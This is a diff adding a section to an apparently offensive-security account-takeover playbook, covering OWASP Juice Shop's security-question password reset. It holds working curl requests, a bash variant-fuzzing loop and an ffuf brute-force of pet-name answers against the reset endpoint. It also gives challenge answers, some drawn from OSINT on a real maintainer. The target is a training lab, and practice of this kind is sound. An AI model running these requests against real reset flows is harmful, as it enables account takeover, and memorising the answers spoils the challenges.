@@ -102,6 +102,48 @@ ffuf -u "https://target.com/account/recover/answer" -X POST \
 ```
 Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.
 
+#### P2 — Juice Shop: security-answer reset path (`POST /rest/user/security-answer`)
+OWASP Juice Shop (`http://localhost:3000`, SQLite backend) resets a password by *answering that user's chosen security question*, not by emailing a token — so Path 8 IS the reset path here. The flow is two requests: read the user's security question, then submit `email + securityAnswer + new password + repeat` to `POST /rest/user/reset-password`. There is no rate limit and no email round-trip, so an OSINT'd or fuzzed answer = instant ATO.
+```bash
+# (1) discover WHICH question a user picked — auto-CRUD REST exposes the join table read-only:
+curl -s "http://localhost:3000/api/SecurityAnswers/3"        # -> {"UserId":3,"SecurityQuestionId":2,...}
+curl -s "http://localhost:3000/api/SecurityQuestions/2"      # -> {"question":"Mother's maiden name = ?"}
+# (the answer hash is NOT returned — you must know/guess the plaintext)
+#
+# (2) complete the reset by answering it (this is the actual ATO request):
+curl -s -X POST "http://localhost:3000/rest/user/reset-password" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"jim@juice-sh.op","answer":"Samuel","new":"pwned123","repeat":"pwned123"}'
+# 200 + {"user":...} = password reset, account owned. 401/{"error":"..."} = wrong answer, retry.
+```
+**OSINT the truthful answer (external — go look it up):** Juice Shop seeds real questions whose answers are NOT in the DB response — they live in the lore. Point the hunter at the product/customer-feedback pages and the per-challenge hints:
+- `jim@juice-sh.op` — *"Your eldest siblings middle name?"* → Jim is a Star Trek nod; the answer is **`Samuel`** (Bones/McCoy lore). Unlocks **"Reset Jim's Password"**.
+- `bender@juice-sh.op` — *"Company you first worked for?"* → Futurama lore → **`Stop'n'Drop`**. Unlocks **"Reset Bender's Password"**.
+- `bjoern@owasp.org` — *"Name of your favorite pet?"* → real-person OSINT (the maintainer's actual pet). Unlocks **"Reset Bjoern's OWASP Password"**; the internal `bjoern@juice-sh.op` account with the SAME pet answer unlocks **"Reset Bjoern's Password"** and is the basis for **"Bjoern's Favorite Pet"**.
+*These three require external OSINT you cannot derive from the box — search the maintainer's public profiles / Juice Shop companion guide for the pet name before brute-forcing.*
+
+**Answer-normalization & spelling-variant fuzzing** — the server compares the *bcrypt of the submitted string* against the stored hash, so casing/spacing/punctuation must match exactly. When you know the answer's *meaning* but not its exact stored form, fuzz variants against `/rest/user/reset-password`:
+```bash
+# generate variants of a known-meaning answer, then test each (no throttle):
+printf '%s\n' "Samuel" "samuel" "SAMUEL" "Sam" " Samuel " "Samuel." "samuel mccoy" \
+  | while read -r a; do
+      code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
+        "http://localhost:3000/rest/user/reset-password" -H "Content-Type: application/json" \
+        -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"$a\",\"new\":\"pwned123\",\"repeat\":\"pwned123\"}")
+      printf '%s\t%s\n' "$code" "$a"
+    done   # 200 = the exact stored normalization
+```
+**"Historical-twist" transforms** — Juice Shop hides answers behind a thematic twist (Star Trek / Futurama / sci-fi), so when raw OSINT fails, transform the candidate: actor↔character name, full↔nickname, franchise alias, year/era substitution, in-universe spelling. Feed those transforms into the same variant loop.
+**Pet-name wordlists** — for the "favorite pet" questions, brute a focused list rather than the OSINT path:
+```bash
+# common-pet-names.txt: Max Bella Charlie Lucy Cooper Daisy Rocky Buddy Molly Bailey Coco Toby ...
+ffuf -u "http://localhost:3000/rest/user/reset-password" -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"email":"bjoern@juice-sh.op","answer":"FUZZ","new":"pwned123","repeat":"pwned123"}' \
+  -w common-pet-names.txt -mc 200 -fr "error" -t 5
+```
+**Juice Shop reality check:** route guards and the answer dropdown are Angular *client-side only* — you never touch the UI; hit `/rest/user/reset-password` directly. The `/api/SecurityAnswers` and `/api/SecurityQuestions` auto-CRUD endpoints leak which question maps to which user but NOT the hashed answer, so the win is always either OSINT or low-entropy brute, never reading the answer out. **Validate** by logging in with the new password (`POST /rest/user/login`) and confirming you hold a JWT for the victim.
+
 ### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
 ```bash
 # (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
